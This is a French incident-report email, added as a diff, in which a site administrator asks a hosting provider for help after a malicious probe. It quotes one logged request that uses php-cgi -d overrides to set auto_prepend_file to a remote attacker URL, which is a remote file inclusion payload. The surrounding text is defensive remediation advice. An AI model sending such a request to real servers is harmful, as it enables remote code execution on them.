@@ -1,0 +1,28 @@
+Objet : Urgent — Sonde malveillante et possible tentative RFI depuis 134.185.89.90
+
+Bonjour,
+
+Le 2026-03-29 à 12:11:10 UTC, notre site a reçu une sonde malveillante depuis l'adresse IP 134.185.89.90 ciblant notre application web. La requête enregistrée dans nos logs analytics est la suivante :
+
+Timestamp : 2026-03-29 12:11:10
+IP : 134.185.89.90
+Requête (brute) : "/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp://happymatures.com/chm/000/003/002/amax.txt"
+User-Agent : "Mozilla/5.0 (compatible; PrivateMonitor/1.0)"
+
+Cette requête tente des overrides PHP via `-d` et force `auto_prepend_file` vers une URL distante (tentative classique de Remote File Inclusion / override de configuration PHP). Nous avons appliqué des mitigations au niveau application (.htaccess et .user.ini), mais nous demandons votre aide pour effectuer des actions côté hébergeur :
+
+1) Bloquer immédiatement l'accès réseau depuis 134.185.89.90 (pare-feu) et tout autre hôte malveillant apparent.
+2) Confirmer si le serveur expose `php-cgi` ou d'autres handlers permettant les overrides `-d` sur PHP pour des vhosts ; le cas échéant, désactiver/supprimer `php-cgi` ou reconfigurer en `php-fpm`/mod_php sécurisé.
+3) Examiner les logs serveur globaux (access, error, mail, syslog) et les crons pour détecter toute exploitation réussie, webshell, processus inattendu ou connexions sortantes vers le domaine attaquant (happymatures.com).
+4) Scanner le système de fichiers et les modifications récentes (notamment fichiers PHP ajoutés/modifiés depuis le 2026-03-15) pour détecter des fichiers suspects.
+5) Si des indices de compromission sont trouvés, indiquer les mesures de remédiation et conserver des snapshots/sauvegardes pour enquête forensique si nécessaire.
+
+Informations complémentaires de notre côté :
+- La sonde est consignée dans `php/analytics/visits.log` de notre dépôt.
+- Nous avons observé la présence de `php-cgi` sur le système (chemin : /opt/php/bin/php-cgi), ce qui pourrait exposer le vecteur `-d`.
+- Nous n'avons pas d'accès `sudo` pour effectuer des blocages ou vérifications au niveau hôte.
+
+Merci de confirmer la prise en charge et les actions immédiates. Si vous avez besoin de logs complets, d'horodatages précis ou de copies de fichiers concernés, je peux vous les fournir.
+
+Cordialement,
+[Votre nom / administrateur du site]
